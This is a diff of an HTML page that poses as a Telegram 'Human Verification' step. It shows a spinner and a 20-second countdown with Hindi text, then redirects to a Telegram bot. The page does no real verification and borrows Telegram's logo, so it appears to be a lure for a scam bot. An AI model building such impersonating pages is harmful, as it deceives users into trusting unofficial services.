@@ -5,29 +5,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Human Verification</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background-color: #0e1621; color: white; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
+        body { background-color: #0f172a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .timer { font-size: 30px; font-weight: bold; color: #00d2ff; }
+        #timer { font-size: 40px; color: #38bdf8; font-weight: bold; margin: 20px; }
     </style>
 </head>
 <body>
     <img src="https://telegram.org/img/t_logo.png" width="80" alt="Telegram">
-    <h2>Please Verify You Are Human</h2>
+    <h1>Please Verify You Are Human</h1>
     <p>सुरक्षा कारणों से, कृपया 20 सेकंड प्रतीक्षा करें।</p>
+    
     <div class="loader"></div>
-    <div class="timer" id="seconds">20</div>
+    <div id="timer">20</div>
+    
     <p>वेरिफिकेशन पूरा होते ही आप वापस चैट पर पहुँच जाएंगे।</p>
 
     <script>
-        var timeLeft = 20;
-        var countdown = setInterval(function() {
+        let timeLeft = 20;
+        let timerElement = document.getElementById('timer');
+
+        let countdown = setInterval(function() {
             timeLeft--;
-            document.getElementById('seconds').textContent = timeLeft;
+            timerElement.innerText = timeLeft;
+
             if (timeLeft <= 0) {
                 clearInterval(countdown);
-                // यहाँ अपने टेलीग्राम बॉट का लिंक डालें (उदा: https://t.me/YourBotUsername)
-                window.location.href = "https://t.me/Myservicetest_bot; 
+                // यह आपको सीधे आपके बॉट पर वापस भेज देगा
+                window.location.href = "https://t.me/Verfication_u_bot"; 
             }
         }, 1000);
     </script>
